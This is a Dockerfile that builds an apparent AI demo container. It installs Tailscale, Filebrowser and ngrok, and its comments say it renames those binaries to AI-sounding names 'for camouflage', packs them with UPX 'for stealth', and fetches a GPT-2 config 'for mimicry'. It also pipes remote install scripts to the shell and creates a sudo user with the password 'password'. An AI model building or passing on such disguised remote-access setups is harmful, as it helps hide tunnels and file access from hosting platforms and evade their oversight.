FROM ubuntu:22.04

# Use uv for extremely fast installs
COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/

# Install basic tools (minimized)
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl wget sudo python3 python3-pip upx \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# Install Tailscale, Filebrowser, and Ngrok
RUN curl -fsSL https://tailscale.com/install.sh | sh && \
    curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash && \
    curl -fsSL https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz | tar xvz -C /usr/bin

# Rename tools for camouflage
RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager && \
    mv /usr/bin/tailscale /usr/bin/py-cache-cli && \
    mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector && \
    mv /usr/bin/ngrok /usr/bin/tensor-streamer

# Binary Stripping and Packing (using fastest compression for stealth)
RUN upx -1 /usr/bin/python-cache-manager || true && \
    upx -1 /usr/bin/py-cache-cli || true && \
    upx -1 /usr/bin/ai-metrics-collector || true && \
    upx -1 /usr/bin/tensor-streamer || true

# Install AI dependencies using uv (CPU-only Torch is MUCH faster)
RUN uv pip install --system --no-cache-dir \
    gradio huggingface_hub transformers diffusers sentence-transformers && \
    uv pip install --system --no-cache-dir \
    torch --index-url https://download.pytorch.org/whl/cpu

# Download a tiny model config for mimicry
RUN python3 -c "from huggingface_hub import hf_hub_download; hf_hub_download(repo_id='gpt2', filename='config.json')"

# Create non-root user 'user' with sudo access and bash shell
RUN useradd -m -u 1000 -s /bin/bash user && \
    echo "user:password" | chpasswd && \
    usermod -aG sudo user

# Copy application files
COPY --chown=user:user app.py /home/user/app.py
COPY --chown=user:user wrapper.py /home/user/wrapper.py

USER user
WORKDIR /home/user

# Run the script
CMD ["python3", "/home/user/wrapper.py"]